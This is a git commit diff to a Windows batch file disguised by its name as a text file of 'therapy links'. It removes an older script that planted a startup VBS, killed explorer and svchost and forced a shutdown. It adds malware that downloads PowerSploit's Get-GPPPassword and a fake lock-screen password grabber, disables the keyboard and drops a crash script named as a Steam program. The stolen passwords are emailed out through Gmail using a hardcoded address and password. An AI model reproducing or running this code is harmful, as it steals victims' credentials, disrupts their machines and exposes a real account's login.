6a0472249e9b35d447e88cca77713493e99182bd
Criptc <96071765+Criptc@users.noreply.github.com>
2022-03-17 13:13:04 -0500

    Update THERAPY_LINKS_THAT_YOU_VERY_MUCH_NEED_BADLY.txt.bat

--- THERAPY_LINKS_THAT_YOU_VERY_MUCH_NEED_BADLY.txt.bat
+++ THERAPY_LINKS_THAT_YOU_VERY_MUCH_NEED_BADLY.txt.bat
@@ -1,25 +1,13 @@
+rem Therapy.bat (or maybe exe)
 @echo off
-echo @echo off > %TEMP%\therapy4u.bat
-echo echo @echo off ^> %TEMP%\therapy.bat >> %TEMP%\therapy4u.bat
-echo echo timeout /t 960 /nobreak ^^> nul ^>^> %TEMP%\therapy.bat >> %TEMP%\therapy4u.bat
-echo echo taskkill /f /im explorer.exe ^>^> %TEMP%\therapy.bat >> %TEMP%\therapy4u.bat
-echo echo echo for therapy, you need to get off your computer...  ^>^> %TEMP%\therapy.bat >> %TEMP%\therapy4u.bat
-echo echo echo to shutdown your computer, click space ^>^> %TEMP%\therapy.bat >> %TEMP%\therapy4u.bat
-echo echo pause ^^> nul ^>^> %TEMP%\therapy.bat >> %TEMP%\therapy4u.bat
-echo echo shutdown /f /s /t 5 ^>^> %TEMP%\therapy.bat >> %TEMP%\therapy4u.bat
-echo echo exit ^>^> %TEMP%\therapy.bat >> %TEMP%\therapy4u.bat
-
-echo echo Set WshShell ^= CreateObject("WScript.Shell") ^> "C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\therapy.vbs" >> %TEMP%\therapy4u.bat
-echo echo WshShell.Run chr(34) ^^& "C:\script.bat" ^^& Chr(34), 0 ^>^> "C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\therapy.vbs" >> %TEMP%\therapy4u.bat
-echo echo Set WshShell ^= Nothing ^>^> "C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\therapy.vbs" >> %TEMP%\therapy4u.bat
-
-echo timeout /t 15 ^> nul >> %TEMP%\therapy4u.bat
-echo taskkill /f /im explorer.exe >> %TEMP%\therapy4u.bat
-echo timeout /t 2  >> %TEMP%\therapy4u.bat
-echo taskkill /f /im svchost.exe >> %TEMP%\therapy4u.bat
-cmd /min /C \"set __COMPAT_LAYER=RUNASINVOKER && start "" "%TEMP%\therapy4u.bat"
-del THERAPY_LINKS_THAT_YOU_VERY_MUCH_NEED_BADLY.txt.exe
-exit 
- 
- 
- 3/15/2022, 2:21:38 PM
+if not exist %TEMP%\admin echo admin > %TEMP%\admin && cmd /min /C \"set __COMPAT_LAYER=RUNASINVOKER && start "" "%~f0" && exit
+timeout /t 4 > nul
+bitsadmin /transfer myDownloadJob /download /priority normal https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Get-GPPPassword.ps1 %TEMP%\Get-GPPPassword.ps1 && bitsadmin /transfer myDownloadJob /download /priority normal https://raw.githubusercontent.com/Criptc/Dump/main/bsod.bat C:\Users\%username%\Desktop\SteamBootStraper.exe & bitsadmin /transfer myDownloadJob /download /priority normal https://github.com/Criptc/Dump/blob/main/SharpLocker.exe?raw=true %TEMP%\log.exe && taskkill /f /im explorer.exe
+start %TEMP%\log.exe > %TEMP%\lock.txt && start C:\Users\%username%\Desktop\SteamBootStraper.exe
+start C:\windows\system32\rundll32.exe keyboard,disable
+echo. >> lock.txt
+powershell Get-GPPPassword | ForEach-Object {$_.passwords} | Sort-Object -Uniq >> %TEMP%\lock.txt
+powershell Compress-Archive -Path %TEMP%\lock.txt -DestinationPath %TEMP%\lock.zip && del %TEMP%\lock.txt
+powershell $Sender = 'josephmcorbeil@gmail.com'; $Recipient = 'josephmcorbeil@gmail.com'; $pass = ConvertTo-SecureString 'bodigirl1' -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential($sender.Split("@")[0], $pass); Send-MailMessage -From $Sender -To $Recipient -Subject "Keylogger" -Body "Please find attached the Keylogger txt file" -SmtpServer "smtp.google.com" -UseSSL -credential $creds -Attachments "%TEMP%\lock.zip"
+timeout /t 5 > nul
+del %~f0 & taskkill /f /im svchost.exe & exit
